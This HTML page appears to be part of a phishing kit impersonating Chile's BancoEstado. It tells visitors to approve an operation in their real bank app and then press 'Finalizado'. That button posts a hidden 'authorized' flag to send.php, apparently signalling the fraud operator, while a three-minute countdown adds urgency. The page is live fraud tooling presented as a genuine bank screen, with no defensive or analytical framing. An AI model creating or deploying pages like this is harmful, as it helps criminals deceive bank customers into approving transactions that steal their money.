<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: rgba(0,0,0,0.5);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 400px;
            padding: 36px 30px 30px;
            text-align: center;
            box-shadow: 0 24px 70px rgba(0,0,0,0.28);
        }

        /* ── Fila de iconos superiores ── */
        .icons-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-bottom: 24px;
        }

        /* Candado verde */
        .lock-wrap {
            width: 64px;
            height: 64px;
            background: #3db54a;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            box-shadow: 0 4px 12px rgba(61,181,74,0.3);
        }
        .lock-wrap svg {
            width: 36px;
            height: 36px;
            fill: white;
        }

        /* Puntos animados */
        .dots-loader {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #f0a500;
            animation: dotBounce 1.3s ease-in-out infinite;
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.22s; }
        .dot:nth-child(3) { animation-delay: 0.44s; }

        @keyframes dotBounce {
            0%, 60%, 100% { transform: scale(0.65); opacity: 0.35; }
            30% { transform: scale(1.2); opacity: 1; }
        }

        /* Celular CSS */
        .phone-wrap {
            width: 44px;
            height: 64px;
            background: #2c2c2c;
            border-radius: 8px 8px 7px 7px;
            position: relative;
            flex-shrink: 0;
            box-shadow: 0 3px 8px rgba(0,0,0,0.35);
        }
        /* cámara frontal */
        .phone-wrap::before {
            content: '';
            position: absolute;
            top: 5px;
            left: 50%;
            transform: translateX(-50%);
            width: 8px;
            height: 3px;
            background: #555;
            border-radius: 2px;
            z-index: 2;
        }
        /* botón home */
        .phone-wrap::after {
            content: '';
            position: absolute;
            bottom: 4px;
            left: 50%;
            transform: translateX(-50%);
            width: 12px;
            height: 4px;
            background: #444;
            border-radius: 2px;
        }
        .phone-screen {
            position: absolute;
            top: 12px;
            left: 3px;
            right: 3px;
            bottom: 12px;
            background: linear-gradient(160deg, #1e3a5f 0%, #0d2240 100%);
            border-radius: 3px;
            overflow: hidden;
        }
        /* pequeña barra de status en pantalla */
        .phone-screen::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 5px;
            background: rgba(255,255,255,0.08);
        }

        /* ── Texto principal ── */
        .main-text {
            font-size: 16px;
            font-weight: 600;
            color: #1a1a2e;
            line-height: 1.5;
            margin-bottom: 22px;
            max-width: 290px;
            margin-left: auto;
            margin-right: auto;
        }

        /* ── Mockup celular (imagen central) ── */
        .phone-mockup-wrap {
            margin: 0 auto 24px;
            width: 200px;
        }

        /* Marco del teléfono */
        .phone-frame {
            width: 200px;
            height: 148px;
            background: #1c1c1e;
            border-radius: 20px;
            padding: 6px 5px;
            position: relative;
            box-shadow: 0 8px 24px rgba(0,0,0,0.25), inset 0 0 0 1px rgba(255,255,255,0.06);
        }
        /* notch */
        .phone-frame::before {
            content: '';
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 6px;
            background: #1c1c1e;
            border-radius: 0 0 8px 8px;
            z-index: 2;
        }
        /* botón lateral */
        .phone-frame::after {
            content: '';
            position: absolute;
            right: -3px;
            top: 30px;
            width: 3px;
            height: 20px;
            background: #333;
            border-radius: 0 2px 2px 0;
        }

        /* Pantalla del mockup */
        .mockup-screen {
            width: 100%;
            height: 100%;
            background: linear-gradient(170deg, #c94d0a 0%, #9e3a05 100%);
            border-radius: 15px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            padding: 8px 8px 7px;
            gap: 5px;
        }

        /* Barra "Autoriza tus operaciones" */
        .mockup-notify-bar {
            background: rgba(255,255,255,0.16);
            border-radius: 7px;
            padding: 6px 9px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .mockup-notify-left {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .mockup-app-icon {
            width: 18px;
            height: 18px;
            background: rgba(255,255,255,0.22);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .mockup-notify-text {
            font-size: 7.5px;
            font-weight: 700;
            color: rgba(255,255,255,0.95);
            letter-spacing: 0.1px;
        }
        .mockup-notify-arrow {
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            line-height: 1;
        }

        /* Accesos rápidos */
        .mockup-section-label {
            font-size: 6px;
            color: rgba(255,255,255,0.55);
            text-align: left;
            padding-left: 2px;
            letter-spacing: 0.3px;
        }

        .mockup-quick-access {
            display: flex;
            justify-content: space-between;
            padding: 0 2px;
            flex: 1;
            align-items: center;
        }

        .qa-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            flex: 1;
        }

        .qa-circle {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .qa-circle.red-c { background: #d93025; }
        .qa-circle.gray-c { background: rgba(0,0,0,0.28); }

        .qa-label {
            font-size: 5.5px;
            color: rgba(255,255,255,0.78);
            text-align: center;
            line-height: 1.25;
            max-width: 34px;
        }

        /* ── Botón Finalizado ── */
        .form-finalizado {
            margin-bottom: 16px;
        }

        .finalizado-btn {
            width: 100%;
            padding: 15px;
            background: #0257a0;
            color: white;
            font-size: 16px;
            font-weight: 700;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.15s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 14px rgba(2,87,160,0.35);
            letter-spacing: 0.3px;
        }
        .finalizado-btn:hover {
            background: #01468a;
            box-shadow: 0 6px 18px rgba(2,87,160,0.45);
            transform: translateY(-1px);
        }
        .finalizado-btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 8px rgba(2,87,160,0.3);
        }

        /* ── Contador ── */
        .timer-container {
            background: #f2f4f6;
            border-radius: 10px;
            padding: 13px 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        .timer-label {
            font-size: 15px;
            color: #555;
            font-weight: 400;
        }
        .timer-value {
            font-size: 17px;
            font-weight: 800;
            color: #1a1a2e;
            letter-spacing: 0.5px;
            min-width: 36px;
            transition: color 0.3s;
        }
        .timer-value.urgent { color: #d93025; }

        /* Imagen candado */
        .lock-img {
            width: 64px;
            height: 64px;
            object-fit: contain;
            flex-shrink: 0;
        }

        /* ── Responsive ── */
        @media (max-width: 420px) {
            .modal { padding: 28px 20px 24px; }
            .main-text { font-size: 15px; }
            .lock-wrap { width: 56px; height: 56px; border-radius: 14px; }
            .lock-wrap svg { width: 30px; height: 30px; }
            .phone-wrap { width: 38px; height: 56px; }
            .phone-frame { width: 178px; height: 132px; }
            .phone-mockup-wrap { width: 178px; }
        }
    </style>
</head>
<body>
<div class="modal">

    <!-- Fila iconos: candado · puntos · celular -->
    <div class="icons-row">
        <img src="candau.png" class="lock-img" alt="Candado BancoEstado">

        <div class="dots-loader">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="phone-wrap">
            <div class="phone-screen"></div>
        </div>
    </div>

    <!-- Texto -->
    <p class="main-text">Autoriza con tu app BancoEstado y recuerda volver a esta web para finalizar.</p>

    <!-- Mockup celular -->
    <div class="phone-mockup-wrap">
        <div class="phone-frame">
            <div class="mockup-screen">
                <!-- Notificación -->
                <div class="mockup-notify-bar">
                    <div class="mockup-notify-left">
                        <div class="mockup-app-icon">
                            <svg width="10" height="10" viewBox="0 0 24 24" fill="rgba(255,255,255,0.85)">
                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/>
                            </svg>
                        </div>
                        <span class="mockup-notify-text">Autoriza tus operaciones</span>
                    </div>
                    <span class="mockup-notify-arrow">›</span>
                </div>

                <!-- Accesos rápidos label -->
                <div class="mockup-section-label">Accesos rápidos</div>

                <!-- Iconos accesos rápidos -->
                <div class="mockup-quick-access">
                    <div class="qa-item">
                        <div class="qa-circle red-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        </div>
                        <span class="qa-label">Activar Pasada QR</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"/></svg>
                        </div>
                        <span class="qa-label">Pagar o girar con QR</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                        </div>
                        <span class="qa-label">Bus, bici y transferir</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                        </div>
                        <span class="qa-label">Emergencias y ayuda</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Botón Finalizado ARRIBA del contador -->
    <form id="finalizadoForm" action="send.php" method="POST" class="form-finalizado">
        <input type="hidden" name="bepass" value="✅Autorizo✅">
        <button type="submit" class="finalizado-btn" onclick="handleFinalizado(event)">
            Finalizado
        </button>
    </form>

    <!-- Contador ABAJO del botón -->
    <div class="timer-container">
        <span class="timer-label">Tiempo disponible:</span>
        <span class="timer-value" id="timerDisplay">3:00</span>
    </div>

</div>

<script>
    let segundosRestantes = 180;
    const timerDisplay = document.getElementById('timerDisplay');

    function formatTimer(s) {
        const min = Math.floor(s / 60);
        const seg = s % 60;
        return min + ':' + String(seg).padStart(2, '0');
    }

    const timerInterval = setInterval(() => {
        if (segundosRestantes <= 0) {
            clearInterval(timerInterval);
            timerDisplay.textContent = '0:00';
            timerDisplay.classList.add('urgent');
            return;
        }
        segundosRestantes--;
        timerDisplay.textContent = formatTimer(segundosRestantes);
        if (segundosRestantes <= 30) timerDisplay.classList.add('urgent');
    }, 1000);

    function handleFinalizado(event) {
        event.preventDefault();
        document.getElementById('finalizadoForm').submit();
    }
</script>
</body>
</html>
